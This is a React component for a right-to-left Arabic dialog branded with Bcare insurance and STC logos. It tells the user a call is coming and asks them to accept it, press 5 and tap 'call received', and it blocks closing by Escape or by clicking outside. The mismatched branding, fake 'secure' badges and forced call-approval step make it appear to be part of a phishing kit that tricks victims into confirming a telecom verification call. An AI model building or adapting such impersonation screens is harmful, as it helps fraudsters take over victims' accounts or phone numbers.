"use client";

import { useEffect, useState } from "react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import {
  PhoneCall,
  Shield,
  Volume2,
  Headphones,
  Clock,
} from "lucide-react";

interface StcCallDialogProps {
  open: boolean;
  onComplete: () => void;
}

export function StcCallDialog({ open, onComplete }: StcCallDialogProps) {
  const [pulseStatus, setPulseStatus] = useState(false);

  useEffect(() => {
    if (!open) {
      setPulseStatus(false);
      return;
    }

    const pulse = setInterval(() => {
      setPulseStatus((p) => !p);
    }, 1500);

    return () => clearInterval(pulse);
  }, [open]);

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent
        className="sm:max-w-md p-0 overflow-hidden border-0 shadow-2xl bg-white"
        dir="rtl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <div className="relative">
          {/* Top gradient bar */}
          <div className="h-1.5 bg-gradient-to-l from-purple-600 via-purple-500 to-pink-500" />

          <div
            dir="rtl"
            className="min-h-[600px] bg-gradient-to-br from-white via-purple-50/30 to-pink-50/20 flex flex-col items-center px-6 py-8"
          >
            {/* Animated background elements */}
            <div className="absolute inset-0 overflow-hidden pointer-events-none">
              <div className="absolute -top-20 -right-20 w-60 h-60 bg-purple-100/40 rounded-full blur-3xl animate-pulse" />
              <div
                className="absolute -bottom-20 -left-20 w-60 h-60 bg-pink-100/30 rounded-full blur-3xl animate-pulse"
                style={{ animationDelay: "1s" }}
              />
            </div>

            {/* Header / Logo */}
            <div className="relative z-10 flex items-center gap-4 mb-8 w-full">
              <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-purple-100 to-pink-100 flex items-center justify-center shadow-inner ring-2 ring-purple-100/50">
                <img
                  src="/Bcare-logo.svg"
                  width={40}
                  className="object-contain"
                  alt="Bcare"
                />
              </div>
              <div className="text-right">
                <p className="text-gray-800 font-bold text-lg">Bcare</p>
                <p className="text-gray-400 text-xs font-medium">بي كير للتأمين</p>
              </div>
              <div className="mr-auto">
                <div className="flex items-center gap-1.5 px-3 py-1.5 bg-purple-50 rounded-full border border-purple-100">
                  <Shield className="w-3 h-3 text-purple-500" />
                  <span className="text-[10px] text-purple-600 font-bold">آمن</span>
                </div>
              </div>
            </div>

            {/* STC My Logo */}
            <div className="relative z-10 mb-6">
              <div className="flex items-center gap-3 bg-gradient-to-r from-purple-700 to-purple-600 rounded-2xl px-6 py-3 shadow-lg shadow-purple-500/20">
                <img src="/stc.svg" width={80} className="brightness-0 invert" alt="STC" />
                <span className="text-white font-bold text-xl">My</span>
                <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
                  <PhoneCall className="w-4 h-4 text-white" />
                </div>
              </div>
            </div>

            {/* Status Badge */}
            <div
              className={`relative z-10 mb-6 px-4 py-2 rounded-full bg-purple-50 border-purple-200 border flex items-center gap-2 transition-all duration-300 ${
                pulseStatus ? "animate-pulse scale-105" : ""
              }`}
            >
              <PhoneCall className="w-4 h-4 text-purple-700" />
              <span className="text-xs font-bold text-purple-700">
                في انتظار المكالمة...
              </span>
            </div>

            {/* Illustration */}
            <div className="relative z-10 w-full max-w-xs mb-6">
              <div className="relative bg-gradient-to-br from-purple-50/50 to-pink-50/30 rounded-3xl p-6 shadow-inner border border-purple-100/50">
                <svg
                  viewBox="0 0 300 200"
                  xmlns="http://www.w3.org/2000/svg"
                  className="w-full"
                >
                  {/* Speech bubble with asterisks */}
                  <rect
                    x="10"
                    y="20"
                    width="130"
                    height="55"
                    rx="10"
                    ry="10"
                    fill="white"
                    stroke="#7c3aed"
                    strokeWidth="2.5"
                    className="drop-shadow-sm"
                  />
                  <polygon
                    points="40,75 60,75 50,92"
                    fill="white"
                    stroke="#7c3aed"
                    strokeWidth="2.5"
                    strokeLinejoin="round"
                  />
                  {/* Pink bar on left of bubble */}
                  <rect x="10" y="20" width="8" height="55" rx="4" fill="#ec4899" />
                  {/* Asterisks */}
                  <text
                    x="35"
                    y="55"
                    fontSize="22"
                    fill="#7c3aed"
                    fontWeight="bold"
                    letterSpacing="4"
                  >
                    ******
                  </text>

                  {/* Phone icon speech bubble */}
                  <rect
                    x="155"
                    y="30"
                    width="120"
                    height="90"
                    rx="14"
                    ry="14"
                    fill="white"
                    stroke="#7c3aed"
                    strokeWidth="2.5"
                    className="drop-shadow-sm"
                  />
                  <polygon
                    points="175,120 200,120 185,138"
                    fill="white"
                    stroke="#7c3aed"
                    strokeWidth="2.5"
                    strokeLinejoin="round"
                  />
                  {/* Phone handset */}
                  <path
                    d="M195,60 Q195,50 205,50 L215,50 Q225,50 225,60 L225,65 Q225,70 220,72 L218,73 Q216,74 217,77 L220,85 Q221,88 218,90 L213,93 Q210,95 207,93 L202,88 Q199,85 201,82 L203,78 Q204,75 202,73 L200,72 Q195,70 195,65 Z"
                    fill="none"
                    stroke="#7c3aed"
                    strokeWidth="2.5"
                  />
                  {/* Signal waves */}
                  <path
                    d="M230,58 Q238,68 230,78"
                    fill="none"
                    stroke="#7c3aed"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />
                  <path
                    d="M237,52 Q250,68 237,84"
                    fill="none"
                    stroke="#7c3aed"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />

                  {/* Decorative plus/cross */}
                  <text
                    x="265"
                    y="145"
                    fontSize="18"
                    fill="#ec4899"
                    fontWeight="bold"
                  >
                    +
                  </text>
                  <text x="278" y="158" fontSize="12" fill="#7c3aed">
                    ·
                  </text>
                  <text x="268" y="162" fontSize="12" fill="#7c3aed">
                    ·
                  </text>
                </svg>
              </div>
            </div>

            {/* Main Text */}
            <div className="relative z-10 text-center space-y-3 mb-8 w-full">
              <h2 className="text-2xl font-black text-gray-900 leading-tight">
                سوف تتلقى مكالمة قريباً.
              </h2>

              <p className="text-gray-600 text-center text-base leading-relaxed max-w-sm mx-auto">
                يرجى الموافقة عليها وإدخال الرقم{" "}
                <span className="text-pink-500 font-black text-lg bg-pink-50 px-2 py-0.5 rounded-lg border border-pink-200 inline-block mx-1">
                  5
                </span>{" "}
                في المكالمة والمتابعة
              </p>
            </div>

            {/* Action Buttons */}
            <div className="relative z-10 w-full max-w-sm space-y-3">
              <button
                onClick={onComplete}
                className="w-full bg-gradient-to-r from-pink-500 via-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600 active:from-pink-700 active:to-rose-700 text-white text-lg font-bold py-4 rounded-2xl transition-all duration-300 shadow-lg shadow-pink-500/25 hover:shadow-xl hover:shadow-pink-500/30 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2"
              >
                <Volume2 className="w-5 h-5" />
                تم تلقي المكالمة
              </button>

              <div className="flex items-center justify-center gap-2 text-gray-400 py-2">
                <Clock className="w-4 h-4 animate-pulse" />
                <span className="text-sm font-medium">في انتظار المكالمة...</span>
              </div>
            </div>

            {/* Security Note */}
            <div className="relative z-10 mt-auto pt-8 flex items-center justify-center gap-2 text-gray-400">
              <Headphones className="w-3 h-3" />
              <span className="text-[11px] font-medium">دعم فني 24/7</span>
              <span className="w-1 h-1 rounded-full bg-gray-300" />
              <Shield className="w-3 h-3" />
              <span className="text-[11px]">اتصال آمن</span>
            </div>
          </div>

          {/* Floating Chat Button */}
          <div className="fixed bottom-6 left-6 z-50">
            <button className="w-14 h-14 rounded-full bg-gradient-to-br from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 flex items-center justify-center shadow-xl shadow-green-500/30 transition-all duration-300 hover:scale-110 hover:shadow-2xl group">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="w-7 h-7 text-white group-hover:scale-110 transition-transform"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                strokeWidth={2}
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
                />
              </svg>
              <span className="absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-pulse" />
            </button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
